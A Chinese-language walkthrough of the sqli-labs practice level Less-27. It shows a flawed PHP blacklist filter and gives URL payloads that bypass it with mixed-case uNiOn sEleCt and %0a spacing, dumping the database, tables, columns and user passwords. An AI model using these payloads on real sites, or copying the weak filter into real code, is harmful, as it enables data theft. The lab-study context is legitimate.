# Less-27 （SELECT/UNION 大小写绕过）

## 查看分析源码
```php
$id= preg_replace('/[\/\*]/',"", $id);      // strip /*
$id= preg_replace('/[--]/',"", $id);        // --
$id= preg_replace('/[#]/',"", $id);         // #
$id= preg_replace('/[ +]/',"", $id);        // 空格和+
$id= preg_replace('/select/m',"", $id);     // select
$id= preg_replace('/[ +]/',"", $id);        // 又来一次
$id= preg_replace('/union/s',"", $id);      // union
$id= preg_replace('/select/s',"", $id);     // 又select
$id= preg_replace('/UNION/s',"", $id);      // 大写UNION
$id= preg_replace('/SELECT/s',"", $id);     // 大写SELECT
$id= preg_replace('/Union/s',"", $id);      // 首字母Union
$id= preg_replace('/Select/s',"", $id);     // 首字母Select
```

看起来很多，其实就三种：`select`、`SELECT`、`Select` 和 `union`、`UNION`、`Union`

没有 `/i` 标志，说明只拦这六个写法，换个大小写组合就绕过去了

空格只拦 `[ +]`，`%0a`（换行）`%09`（tab）都能用

注释 `--` `#` `/*` 全封了，用 `or '1'='1'` 闭合尾部引号

```
id='-1' uNiOn sEleCt 1,2,3 or '1'='1' LIMIT 0,1
     ↑___↑                     ↑__↑   ↑       ↑
    闭合了                    or '1'  消耗掉最后这个引号
```

## order by

```
?id=1'%0aorder%0aby%0a3%0aor%0a'1'='1
?id=1'%0aorder%0aby%0a4%0aor%0a'1'='1
```

4 报错 → 3 列

## 回显位

```
?id=-1'%0auNiOn%0asEleCt%0a1,2,3%0aor%0a'1'='1
```

回显 2、3

## 爆库名

```
?id=-1'%0auNiOn%0asEleCt%0a1,database(),3%0aor%0a'1'='1
```

## 爆表名

```
?id=-1'%0auNiOn%0asEleCt%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0aor%0a'1'='1
```

## 爆列名

```
?id=-1'%0auNiOn%0asEleCt%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users'%0aor%0a'1'='1
```

## 爆数据

```
?id=-1'%0auNiOn%0asEleCt%0a1,group_concat(username,0x3a,password),3%0afrom%0ausers%0aor%0a'1'='1
```

总结：黑名单只写了 6 种大小写，但没加 `/i`，所以 `uNiOn sEleCt` 直接绕。注释全封就用 `or '1'='1'` 兜底。空格 `[ +]` 只拦空格和加号，换行符 `%0a` 随便用。
